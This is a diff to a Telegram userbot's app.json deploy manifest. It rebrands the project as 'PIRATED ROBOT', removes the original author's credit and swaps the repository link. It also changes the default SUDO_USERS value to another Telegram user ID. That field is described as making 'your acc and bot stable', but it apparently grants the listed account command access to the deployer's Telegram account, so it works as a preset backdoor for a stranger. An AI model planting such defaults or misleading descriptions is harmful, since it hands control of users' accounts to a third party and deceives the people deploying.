@@ -1,6 +1,6 @@
 {
-  "name": "HardcoreUserbot",
-  "description": "Userbot created by a @Hack12R, Join https://t.me/HardcoreUserbot for any problems or support",
+  "name": "PIRATED ROBOT",
+  "description": "Userbot created",
   "logo": "https://telegra.ph/file/1b1304649ee3ecd281322.jpg",
   "keywords": [
     "telegram",
@@ -9,7 +9,7 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://github.com/Hack12R/HardcoreUserbot/",
+  "repository": "https://github.com/meratestaccount/PIRATEDUB/",
   "website": "#TODO",
   "success_url": "#TODO",
   "env": {
@@ -66,7 +66,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "1037944593",
+      "value": "1154075796",
       "required": false
     },
     "HEROKU_APP_NAME": {
